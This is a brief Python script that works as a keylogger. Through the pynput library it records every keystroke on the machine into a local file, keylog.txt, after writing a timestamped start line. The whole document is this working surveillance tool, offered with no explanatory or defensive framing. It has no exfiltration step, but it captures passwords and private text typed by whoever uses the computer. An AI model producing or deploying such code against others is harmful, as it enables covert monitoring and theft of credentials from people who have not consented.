from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except:
            f.write(f"[{key}]")

with open(log_file, "a") as f:
    f.write(f"\n--- Logging started {datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

